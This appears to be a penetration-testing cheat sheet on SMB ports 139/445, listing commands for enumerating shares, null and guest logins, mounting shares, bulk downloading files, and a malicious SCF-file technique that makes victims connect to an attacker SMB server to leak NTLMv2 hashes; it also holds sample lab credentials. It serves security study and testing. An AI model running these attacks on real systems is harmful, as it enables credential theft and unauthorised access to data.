# SMB - 139/445

## SMB Information

### Port 139

Standing for Network Basic Input/Output System, NetBIOS is a networking industry standard developed by IBM, Microsoft, and Sytek. It is currently mostly used by Microsoft Windows operating systems to provide certain services to the other network hosts. NetBIOS provides services associated with the OSI model’s session layer, allowing applications on different computers to communicate over the local network. It also allows the proper transmission of data over the network. A NetBIOS name is up to 16 characters long and usually, separate from the computer name. Two applications start a NetBIOS session when one \(the client\) sends a command to “call” another client \(the server\) over **TCP Port 139**. 

Reference:

{% embed url="https://www.bitwarsoft.com/what-is-netbios.html" %}

### Port 445

While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. **SMB** stands for ‘**Server Message Blocks**’. Server Message Block in modern language is also known as **Common Internet File System \(cifs\)**. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.

For instance, on Windows, SMB can run directly over TCP/IP without the need for NetBIOS over TCP/IP. This will use the port 445. On other systems, you’ll find services and applications using port 139. This means that SMB is running with NetBIOS over TCP/IP**.** 

### IPC$ Share

The IPC$ shares and interacts with other services via named pipes. The IPC$ share can contain the following information:

* Operating System 
* Parent Domain
* Local Users and Groups
* Available SMB shares
* Effective System Security Policies



## SMB List Shares <a id="smb-list-shares"></a>

### smbmap <a id="smbmap"></a>

List SMB shares permissions:

```text
smbmap -H 10.10.10.10
```

### smbclient <a id="smbclient"></a>

List SMB shares with smbclient:

```
smbclient -L 10.10.10.10
smbclient -L \\$ip -N --option='client min protocol=NT1'
```

### crackmapexec <a id="crackmapexec"></a>

List SMB shares with crackmapexec:

```text
crackmapexec smb 10.10.10.10 --shares
```

### enum4linux <a id="enum4linux"></a>

List SMB shares with enum4linux:

```text
enum4linux 10.10.10.10
```

## SMB Authentication <a id="smb-authentication"></a>

### smbmap <a id="smbmap-2"></a>

Authenticate to a domain controller SMB share with valid credentials:

```text
smbmap -d domain.name -u username -p password -H 10.10.10.10
smbmap -H 10.10.10.103 -u amanda -p Ashare1972
```

### smbclient <a id="smbclient-2"></a>

Authenticate as null:

```text
smbclient -U '' -L 10.10.10.10
```

Authenticate as the guest user:

```text
smbclient -U 'guest' -L 10.10.10.10
```

Authenticate as valid user \(type password on prompt\):

```text
smbclient -U 'username' -L 10.10.10.10
```

### crackmapexec <a id="crackmapexec-2"></a>

Authenticate as null:

```text
crackmapexec smb 10.10.10.10 --shares -u '' -p ''
```

Authenticate as a valid user with crackmapexec:

```text
crackmapexec smb 10.10.10.10 --shares -u username -p password
```

## SMB Protocol Error Fix <a id="smb-connect-to-share"></a>

Error Code:

```text
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```

Some servers have an OLD SMBv1 protocol in use, to accept the connection we must specify the minimum protocol version we can accept with:

```text
smbclient //$ip/share -N --option='client min protocol=NT1'
```

You can also add the following to `/etc/samba/smb.conf` under the `[global]` section:

```text
client min protocol = NT1
```

## SMB Capture NTLMv2 with SCF <a id="smb-connect-to-share"></a>

**SCF** \(Shell Command File\) are simple files that can be used to perform a connection to the attacker machine by using the **SMB** protocol. The interesting purpose of that kind of file is that they can perform a small and limited set of operations, but can be executed when the user will browse the file, without the explicit necessity to execute it.

The attacker can take profit from this vulnerability to make a request to his own machine and then get the NTLMv2 hash of the victim.

Create a shared folder and let it open:

```text
impacket-smbserver share $(pwd) -smb2support
```

1. Create the malicious SCF file

   ```text
   [Shell]
   Command=2
   IconFile=\\10.10.10.11\share\pentestlab.ico
   [Taskbar]
   Command=ToggleDesktop
   ```

2. Copy the malicious file in the desired victim shared resource

Check the shared folder that you have created previously and if there is an interaction between the victim and the file, you will receive the NTLMv2 hash of the victim. You can then try to crack the hash with **john or hashcat.**

## SMB Connect to Share <a id="smb-connect-to-share"></a>

### smbmap <a id="smbmap-3"></a>

Recursively list the share:

```text
smbmap -R ShareName -H 10.10.10.10
```

### smbclient <a id="smbclient-3"></a>

We can connect to share with the following example:

```text
smbclient -L //10.10.10.10/ShareName
```

## SMB Mount Share <a id="smb-mount-share"></a>

Create a directory to mount the share:

```text
sudo mkdir -p /mnt/smb
```

Mount the remote share to your machines/host without credentials:

```text
sudo mount -t cifs //10.10.10.10/ShareName/ /mnt/smb
```

Mount with valid credentials method:

```text
sudo mount -t cifs -o 'user=username,password=pass' //10.10.10.10/sharename$ /mnt/share
sudo mount -t cifs -o username=amanda,password=Ashare1972 "//10.10.10.103/CertEnroll" /mnt
```

Tip, if there are a few files \(not too much\) you might want to copy the files into your localhost:

```text
cp * /home/kali/htb/sizzle/loot/
```

## SMB Password Spray <a id="smb-password-spray"></a>

## SMB Usage Cheatsheet <a id="smb-usage-cheatsheet"></a>

Download all files recursively without prompts:

```text
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

